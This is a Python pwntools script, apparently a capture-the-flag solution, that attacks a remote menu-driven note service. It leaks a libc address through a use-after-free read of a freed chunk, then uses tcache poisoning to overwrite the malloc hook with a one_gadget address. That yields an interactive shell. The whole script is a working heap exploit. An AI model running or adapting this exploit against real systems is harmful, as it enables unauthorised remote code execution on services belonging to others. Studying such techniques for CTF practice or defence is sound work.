import pwn
from os import getenv

ONE_GADGETS = [0xe699e, 0xe69a1, 0xe69a4, 0x10af39]

io = pwn.remote(getenv("IP"), int(getenv("PORT")))


def Add(mark, size, comment):
    io.sendline(b"1")
    io.recvuntil(b": ")

    io.sendline(str(mark).encode())
    io.recvuntil(b": ")

    io.sendline(str(size).encode())
    io.recvuntil(b": ")

    io.send(comment)
    io.recvuntil(b": ")


def Edit(index, mark, size, data):
    io.sendline(b"2")
    io.sendlineafter(b': ', str(index).encode())
    io.sendlineafter(b': ', str(mark).encode())
    io.sendlineafter(b': ', str(size).encode())
    io.sendlineafter(b': ', data)

    io.recvuntil(b": ")


def View(index):
    io.sendline(b"3")
    io.sendlineafter(b': ', str(index).encode())

    comment = io.recvuntil(b'1)')[15:]
    io.recvuntil(b": ")

    return comment


def Remove(index):
    io.sendline(b"4")
    io.sendlineafter(b': ', str(index).encode())

    io.recvuntil(": ")


def Exit():
    io.sendline(b'5')
    io.interactive()


Add(0, 0x410, b"/bin/bash")  # 0
Add(1, 0x40, b"/bin/bash")   # 1
Add(2, 0x40, b"/bin/bash")   # 2


# fill up tcache and prevent chunk consolidation
for i in range(3, 10):
    Add(i, 0x60, b"/bin/bash")

for i in range(3, 10):
    Remove(i)

# move large chunk to unsorted bin
Remove(0)
leak = View(0)
leak = leak.split(b': ')[2][:-2]
leak = int.from_bytes(leak, byteorder="little")

libc_base = leak - 0x1eabe0

print("[+] leak: ", hex(leak))
print("[+] base: ", hex(libc_base))

# tcache poisoning
Remove(1)
Remove(2)

# malloc hook
Edit(2, 5, 0x40, pwn.p64(libc_base + 0x1eab5d))

Add(0, 0x40, b"/bin/bash")

Add(0, 0x40, b"\x00"*19 + pwn.p64(libc_base + ONE_GADGETS[1]))

io.sendline(b"1")
io.interactive()
